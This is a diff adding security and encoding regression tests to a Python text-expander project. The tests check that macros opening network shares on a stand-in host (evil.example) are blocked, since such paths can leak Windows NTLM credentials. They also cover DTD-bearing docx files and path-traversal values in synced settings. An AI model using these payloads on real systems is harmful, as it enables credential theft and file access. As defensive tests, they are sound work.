@@ -343,3 +343,117 @@ def test_choice_menu_hides_the_names_of_locked_phrases(tmp_path):
     texts = " ".join(t for t, _ in rows)
     assert "Public" in texts and "Bank PIN" not in texts and "Locked phrase" in texts
     pop.hide_all(force=True)
+
+
+# ---------------------------------------------------------------- 0.6.5: review of #24 and #26
+@pytest.mark.parametrize("content", [
+    r'{#textfile "\\evil.example\s\a.txt"}', r'{#document "//evil.example/s/a.rtf"}',
+    r'{#csv \\evil.example\s\a.csv -fromrow 1}', r'{#image "\\?\UNC\evil.example\s\a.png"}',
+    r'{#embed "\\evil.example\s\a.txt"}', r'{#xls "\\evil.example\s\a.xlsx" -cell A1}',
+    r'{#sql "//evil.example/s/db.sqlite" "SELECT 1"}', r'{#pastefile "\\evil.example\s\a.pdf"}'])
+def test_reading_a_network_share_needs_an_approved_phrase(content):
+    """R14: on Windows, opening \\\\host\\share sends the user's NTLM credentials to that host."""
+    assert security.scan_privileged(content) == [security.NETWORK_READ]
+    s = Store(":memory:")
+    import_dict(s, {"format": "phraseforge", "phrases": [{"description": "Leak", "content": content}]})
+    p = s.phrases()[0]
+    app = _App(s)
+    assert appmod.approved_for(app, p, _req(p.id, automatic=False)) is False and app.asked == [1]
+
+
+def test_local_files_need_no_approval(tmp_path):
+    f = tmp_path / "note.txt"
+    f.write_text("local text", encoding="utf-8")
+    for content in (f'{{#textfile "{f}"}}', r'{#document "C:\letters\a.docx"}', '{#image /home/me/a.png}'):
+        assert security.scan_privileged(content) == []
+    from phraseforge.host import ExpansionContext
+    from phraseforge.macros.engine import MacroEngine
+    from tests.test_macros import FakeHost
+    out = MacroEngine(FakeHost()).expand_to_text(f'{{#textfile "{f}"}}', ExpansionContext(allow_privileged=False))
+    assert out == "local text"
+
+
+def test_a_network_path_built_at_run_time_is_blocked_too():
+    """The static scan cannot see a path made by another macro; the engine checks it."""
+    from phraseforge.host import ExpansionContext
+    from phraseforge.macros.engine import MacroEngine
+    from tests.test_macros import FakeHost
+    content = "{#textfile {#lower //EVIL.EXAMPLE/S/A.TXT}}"
+    assert security.scan_privileged(content) == []
+    out = MacroEngine(FakeHost()).expand_to_text(content, ExpansionContext(allow_privileged=False))
+    assert "blocked" in out
+
+
+def test_docx_dtd_is_refused_in_any_encoding(tmp_path):
+    """R17: the byte search for <!DOCTYPE missed a UTF-16 document.xml."""
+    import zipfile
+    from phraseforge.importers import files
+    xml = ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE d [<!ENTITY a "AAAA">]>'
+           '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
+           '<w:body><w:p><w:r><w:t>&a;</w:t></w:r></w:p></w:body></w:document>')
+    for enc in ("utf-16", "utf-8"):
+        p = tmp_path / f"{enc}.docx"
+        with zipfile.ZipFile(p, "w") as z:
+            z.writestr("word/document.xml", xml.replace("UTF-16", enc.upper()).encode(enc))
+        with pytest.raises(ValueError, match="DTD"):
+            files.docx_paragraphs(p)
+
+
+@pytest.mark.parametrize("rtf,text", [
+    (r"{\rtf1\mac\ansicpg10000 caf\'8e\par}", "café"),          # old Mac RTF
+    (r"{\rtf1\ansi\ansicpg0 a\'e9\par}", "aé"),                  # no such code page: RTF default
+    (r"{\rtf1\ansi\ansicpg99999 a\'e9\par}", "aé"),
+    (r"{\rtf1\mac caf\'8e}", "café"),
+    (r"{\rtf1\ansi\uc1 hi \u-10179?\u-8576?}", "hi \U0001F680"),   # emoji as a surrogate pair (Word)
+])
+def test_rtf_with_any_code_page_still_reads(rtf, text):
+    """R16: an unknown \\ansicpg raised LookupError and broke the import and {#document}."""
+    from phraseforge.importers import files
+    assert files.rtf_to_text(rtf) == text
+
+
+def test_spelling_suggestions_never_block_the_menu():
+    """R15: a long Arabic word kept the UI frozen for up to 30 s while Hunspell searched."""
+    import threading
+    import time
+    from phraseforge import spell
+    release = threading.Event()
+
+    class Slow:
+        def lookup(self, w):
+            return False
+
+        def suggest(self, w):
+            release.wait(5)
+            yield "صحيح"
+
+    c = spell.SpellChecker(lambda k, d="": d, loader=lambda code: Slow())
+    c.dictionary("ar", wait=True)
+    start = time.monotonic()
+    assert c.suggest_within("خطأطويل", timeout=0.2) is None          # still searching
+    assert time.monotonic() - start < 1
+    assert c.suggest_within("خطأطويل", timeout=0.2) is None          # same search, not a second one
+    for i in range(c.MAX_SEARCHES - 1):
+        assert c.suggest_within(f"كلمة{i}", timeout=0.05) is None
+    assert c.suggest_within("زائدة", timeout=0.05) is None            # limit reached: not started
+    assert len(c._searching) == c.MAX_SEARCHES
+    release.set()
+    for _ in range(50):
+        if c.suggest_within("خطأطويل", timeout=0.1) == ["صحيح"]:
+            break
+        time.sleep(0.02)
+    assert c.suggest_within("خطأطويل") == ["صحيح"]                     # kept for the next click
+
+
+def test_spell_settings_from_sync_cannot_name_a_path(tmp_path, monkeypatch):
+    """R18: spell.latin came from synced settings and was used as a file name."""
+    from phraseforge import spell
+    monkeypatch.setenv("PHRASEFORGE_HOME", str(tmp_path / "data"))
+    (tmp_path / "x.aff").write_text("SET UTF-8\n", encoding="utf-8")
+    (tmp_path / "x.dic").write_text("1\nhello\n", encoding="utf-8")
+    loaded = []
+    settings = {"spell.latin": "../../x", "spell.arabic": "../x"}
+    c = spell.SpellChecker(lambda k, d="": settings.get(k, d), loader=lambda code: loaded.append(code))
+    assert c.code_for("latin") == "" and c.code_for("arabic") == ""
+    assert not spell.installed("../../x")
+    assert not c.is_misspelled("helo") and loaded == []
